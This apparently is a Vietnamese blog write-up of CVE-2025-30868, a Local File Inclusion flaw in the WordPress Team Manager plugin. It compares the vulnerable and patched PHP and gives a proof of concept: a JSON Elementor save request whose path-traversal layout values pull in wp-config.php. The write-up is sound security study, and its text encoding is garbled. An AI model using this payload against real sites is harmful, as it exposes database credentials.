---
title: CVE-2025-30868 Analysis & POC
description: Security Vulnerability in WordPress Team Manager Plugin.
date: 2025-10-15 19:00:00 +0700
categories: [CVE Analyst]
tags: [analyst, plugin, lfi]
images: ["app.png"]
featuredImage: "app.png"

lightgallery: true

toc:
  auto: false
---

<!--more-->

## CVE & Basic Info
Plugin **Team Manager** phi√™n b·∫£n **‚â§ 2.1.23** ch·ª©a l·ªó h·ªïng **Local File Inclusion** cho ph√©p k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c ƒëi·ªÅu khi·ªÉn tham s·ªë file trong l·ªánh `include/require`, t·ª´ ƒë√≥ ch√®n ho·∫∑c ƒë·ªçc c√°c t·ªáp c·ª•c b·ªô tr√™n m√°y ch·ªß (v√≠ d·ª• file c·∫•u h√¨nh ch·ª©a credential), d·∫´n t·ªõi r√≤ r·ªâ th√¥ng tin nh·∫°y c·∫£m v√† trong m·ªôt s·ªë c·∫•u h√¨nh c√≥ th·ªÉ d·∫´n t·ªõi th·ª±c thi m√£.

* **CVE ID**: [CVE-2025-30868](https://www.cve.org/CVERecord?id=CVE-2025-30868)
* **Vulnerability Type**: Local File Inclusion
* **Affected Versions**: <= 2.1.23
* **Patched Versions**: 2.2.0
* **CVSS severity**: Low (7.5)
* **Required Privilege**: Contributor
* **Product**: [WordPress Team Manager Plugin](https://wordpress.org/plugins/wp-team-manager/)

## Requirements
* **Local WordPress & Debugging**: [Local WordPress and Debugging](https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/).
* **Plugin versions** - **Team Manager**: **2.1.23** (vulnerable) v√† **2.2.0** (patched).
* **Diff tool** - [**Meld**](https://meldmerge.org/) ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n.
* [**Elementor plugin**](https://wordpress.org/plugins/elementor/)

## Analysis

### Patch diff

**B·∫£n l·ªói**:

```php {filename="Helper.php v2.1.23" hl_lines=[14]}
public static function renderElementorLayout(string $layout, array $data, array $settings): void
{
    $styleTypeKey = "{$layout}_style_type";
    $styleType = stripslashes($settings[$styleTypeKey]);
    $path = stripslashes(TM_PATH . '/public/templates/elementor/layouts/' . $layout . '/');
    $templateName = sanitize_file_name( $styleType . '.php' );
    //allowed file type
    $allowedFileTypes = [
        'php'
    ];
    $ext = pathinfo($path . $templateName, PATHINFO_EXTENSION);
    if (in_array($ext, $allowedFileTypes)) {
        if (file_exists($path . $templateName)) {
            include self::locateTemplate($templateName, '', $path);
        }
    }

}

private static function locateTemplate(string $templateName, string $templatePath = '', string $defaultPath = ''): string
{
    $templatePath = $templatePath ?: 'public/templates';
    $defaultPath = $defaultPath ?: TM_PATH . '/public/templates/';
    $template = locate_template(trailingslashit($templatePath) . $templateName);
    return $template ?: "{$defaultPath}{$templateName}";
}
```

Trong phi√™n b·∫£n l·ªói, h√†m `renderElementorLayout()` kh√¥ng x√°c th·ª±c gi√° tr·ªã ƒë·∫ßu v√†o. **attacker** c√≥ th·ªÉ v∆∞·ª£t qua logic tr√™n khi ki·ªÉm so√°t ƒë∆∞·ª£c `$layout` v√† `$settings`, v√≠ d·ª•:

**Trong h√†m `renderElementorLayout()`**:

* `$layout = "../../../../../../.."`
* `$settings['../../../../../../.._style_type'] = "wp-config"`

Khi ƒë√≥:

* `$styleType = 'wp-config'`
* `$path = TM_PATH . '/public/templates/elementor/layouts/../../../../../../../'`
* `$templateName=wp-config.php` 
* `$path . $templateName = TM_PATH . '/public/templates/elementor/layouts/../../../../../../../wp-config.php`

{{< figure src="debug1.png" caption="Debugger gi√° tr·ªã c·ªßa c√°c bi·∫øn" >}}

Sau khi v∆∞·ª£t qua c√°c m·ªánh ƒë·ªÅ `if` th√¨ `include` gi√° tr·ªã tr·∫£ v·ªÅ c·ªßa `locateTemplate(wp-config.php, '', TM_PATH . '/public/templates/elementor/layouts/../../../../../../../')` :

```php {filename="Helper.php v2.1.23" hl_lines=[6]}
private static function locateTemplate(string $templateName, string $templatePath = '', string $defaultPath = ''): string
{
    $templatePath = $templatePath ?: 'public/templates';
    $defaultPath = $defaultPath ?: TM_PATH . '/public/templates/';
    $template = locate_template(trailingslashit($templatePath) . $templateName);
    return $template ?: "{$defaultPath}{$templateName}";
}
```

Khi ƒë√≥:

* `$templatePath = public/templates`
* `$defaultPath = TM_PATH . '/public/templates/elementor/layouts/../../../../../../../'`
* `$locate_template = locate_template('public/templates/wp-config.php') = ""` - [locate_template()](https://developer.wordpress.org/reference/functions/locate_template/) s·∫Ω tr·∫£ v·ªÅ ƒë∆∞·ªùng d·∫´n tuy·ªát ƒë·ªëi c·ªßa file n·∫øu t√¨m th·∫•y, ng∆∞·ª£c l·∫°i tr·∫£ v·ªÅ chu·ªói r·ªóng `""`.
* Khi `$locate_template` r·ªóng th√¨ tr·∫£ v·ªÅ  `TM_PATH . '/public/templates/elementor/layouts/../../../../../../../wp-config.php'` ƒë·ªÉ `include`.

**B·∫£n v√°**:

```php {filename="Helper.php v2.2.0" hl_lines = [3, 5, 13, 18, 23, 26, 29, 40, 46, 58, 70, 74, 85]}
public static function renderElementorLayout(string $layout, array $data, array $settings): void
{
    $allowedLayouts = ['grid', 'list', 'slider', 'table', 'isotope']; // Allowed layouts

    if (!in_array($layout, $allowedLayouts, true)) {
        wp_die(__('Invalid layout.', 'wp-team-manager'));
    }

    $styleTypeKey = "{$layout}_style_type";
    $styleType = $settings[$styleTypeKey] ?? '';

    // Ensure only safe characters (alphanumeric + underscores)
    if (!preg_match('/^[a-zA-Z0-9_-]+$/', $styleType)) {
        wp_die(__('Invalid style type.', 'wp-team-manager'));
    }

    // Ensure constants exist before using them
    if (!defined('TM_PATH')) {
        wp_die(__('TM_PATH is not defined.', 'wp-team-manager'));
    }

    // Define Free path (always available)
    $basePath = realpath(TM_PATH . '/public/templates/elementor/layouts/');

    // Define Pro path if available
    $proPath = defined('TM_PRO_PATH') ? realpath(TM_PRO_PATH . '/public/templates/elementor/layouts/') : null;

    // Ensure the free path is valid
    if (!$basePath) {
        wp_die(__('Invalid base template path.', 'wp-team-manager'));
    }

    $templateName = sanitize_file_name($styleType . '.php');

    // Define possible template paths (Pro first, then Free)
    $proFullPath = $proPath ? $proPath . '/' . $layout . '/' . $templateName : null;
    $freeFullPath = $basePath . '/' . $layout . '/' . $templateName;

    // Check if Pro template exists and is readable
    if ($proFullPath && is_readable($proFullPath) && strpos(realpath($proFullPath), $proPath) === 0) {
        include $proFullPath;
        return;
    }

    // Check if Free template exists and is readable
    if (is_readable($freeFullPath) && strpos(realpath($freeFullPath), $basePath) === 0) {
        include $freeFullPath;
        return;
    }

    // If neither file is found, show an error
    wp_die(__('Template not found or invalid file.', 'wp-team-manager'));
}

private static function locateTemplate(string $templateName, string $templatePath = '', string $defaultPath = ''): string
{
    // Ensure template name is safe (allow only alphanumeric, dashes, and underscores)
    if (!preg_match('/^[a-zA-Z0-9_-]+\.php$/', $templateName)) {
        die('Invalid template name.');
    }

    $templatePath = $templatePath ?: 'public/templates';
    $defaultPath = $defaultPath ?: TM_PATH . '/public/templates/';

    // Ensure paths are properly resolved
    $resolvedDefaultPath = realpath($defaultPath);
    $resolvedTemplatePath = realpath(trailingslashit($templatePath));

    // Validate resolved paths
    if (!$resolvedDefaultPath || strpos($resolvedDefaultPath, realpath(TM_PATH . '/public/templates/')) !== 0) {
        die('Invalid default path.');
    }

    if ($resolvedTemplatePath && strpos($resolvedTemplatePath, realpath(TM_PATH . '/public/templates/')) === 0) {
        $template = locate_template($resolvedTemplatePath . '/' . $templateName);
        if ($template && file_exists($template)) {
            return $template;
        }
    }

    // Build the final safe path
    $finalPath = $resolvedDefaultPath . '/' . $templateName;

    // Ensure the final path is within the allowed directory
    if (file_exists($finalPath) && strpos(realpath($finalPath), $resolvedDefaultPath) === 0) {
        return $finalPath;
    }

    die('Template not found or invalid.');
}
```

B·∫£n v√° ƒë√£ √°p d·ª•ng x√°c th·ª±c ƒë·∫ßu v√†o nghi√™m ng·∫∑t, ki·ªÉm tra ƒë∆∞·ªùng d·∫´n tuy·ªát ƒë·ªëi, v√† h·∫°n ch·∫ø layout h·ª£p l·ªá, gi√∫p lo·∫°i b·ªè ho√†n to√†n kh·∫£ nƒÉng khai th√°c file ngo√†i ph·∫°m vi cho ph√©p => ngƒÉn **Local File Inclusion (LFI)**

### Vulnerable Code 

> [!INFO]
> Ch·ªØ **Elementor** trong t√™n h√†m `renderElementorLayout()` li√™n quan ƒë·∫øn plugin [**Elementor plugin**](https://wordpress.org/plugins/elementor/) trong WordPress, d√πng ƒë·ªÉ t·∫°o n·ªôi dung cho **post**.

Khi g·ª≠i request ch·ªânh s·ª≠a post ch·ª©a **widgets Team Manager** n√†y ho·∫∑c m·ªü post sau khi l∆∞u th√¨ `renderElementorLayout()` s·∫Ω ƒë∆∞·ª£c g·ªçi.

{{< figure src="plugin_element.png" caption="Plugin element trong Elementor" >}}

B·∫Øt request ch·ªânh s·ª≠a b·∫±ng BurpSuite:

{{< figure src="setting.png" caption="Key settings trong request" >}}

Quan s√°t ta th·∫•y c√≥ key `settings` ch·ª©a c√°c key `layout_type` v√† `{layout_type_value}_stype_type` t∆∞∆°ng ·ª©ng v·ªõi code ta ph√¢n t√≠ch ·ªü tr√™n:

```php
$styleTypeKey = "{$layout}_style_type";
$styleType = stripslashes($settings[$styleTypeKey]);
```

üëâ Ta c√≥ th·ªÉ ki·ªÉm so√°t c√°c gi√° tr·ªã ·ªü ƒë√¢y.

## Exploit
### Proof of Concept (PoC)

#### Step 1

T·∫°o team m·ªõi t·∫°i endpoint: `wp-admin/post-new.php?post_type=team_manager` v√¨ khi c√≥ team th√¨ m·ªõi c√≥ gi√° tr·ªã ƒë·ªÉ th√™m v√†o layout c·ªßa **widget Team Manager**.

#### Step 2

T·∫°o post b·∫±ng **Elementor**, th√™m **widgets Team Manager**.

{{< figure src="widgets.png" caption="Th√™m Team Manager widget v√†o post" >}}


#### Step 3

**Submit**, b·∫Øt request b·∫±ng **BurpSuite** g·ª≠i ƒë·∫øn **Repeater**

#### Step 4

B√¥i ƒëen gi√° tr·ªã c·ªßa param `action`,s·ª≠a payload t·∫°i **tab Inspector** v√† g·ª≠i l·∫°i request

```json
{
  "save_builder": {
    "action": "save_builder",
    "data": {
      "status": "pending",
      "elements": [
        {
          "id": "e9249f1",
          "elType": "container",
          "isInner": false,
          "isLocked": false,
          "settings": {},
          "elements": [
            {
              "id": "3e7c95b",
              "elType": "widget",
              "isInner": false,
              "isLocked": false,
              "settings": {
                "layout_type": "../../../../../../..",
                "../../../../../../.._style_type": "wp-config"
              },
              "elements": [],
              "widgetType": "wtm-team-manager"
            }
          ]
        },
        {
          "id": "b132b28",
          "elType": "container",
          "isInner": false,
          "isLocked": false,
          "settings": {},
          "elements": []
        }
      ],
      "settings": {
        "post_title": "Team",
        "post_status": "pending"
      }
    }
  }
}
```

**Result**:

Debugger ƒë√£ nh·∫£y ƒë·∫øn `wp-config.php`

{{< figure src="result.png" caption="K·∫øt qu·∫£ LFI th√†nh c√¥ng" >}}

## Conclusion

CVE-2025-30868 l√† LFI trong Team Manager ‚â§2.1.23: `renderElementorLayout()` kh√¥ng x√°c th·ª±c `$layout`/`$settings`, cho ph√©p path traversal v√† `include()` file ngo√†i √Ω mu·ªën. ƒê√£ v√° trong **v2.2.0** b·∫±ng whitelist, regex v√† ki·ªÉm tra `realpath()`.

## Key takeaways

* Kh√¥ng d√πng input th√¥ ƒë·ªÉ build `include`.
* D√πng **whitelist** cho layout/template.
* Sanitize t√™n file + `realpath()` + `is_readable()` tr∆∞·ªõc khi include.
* V·ªõi endpoint public: ki·ªÉm so√°t input server-side, nonce kh√¥ng ƒë·ªß.

## References

[File Inclusion/Path traversal ‚Äî Hacktrick](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols)

[ WordPress Team Manager Plugin <= 2.1.23 is vulnerable to Local File Inclusion ](https://patchstack.com/database/wordpress/plugin/wp-team-manager/vulnerability/wordpress-team-manager-plugin-2-1-23-local-file-inclusion-vulnerability)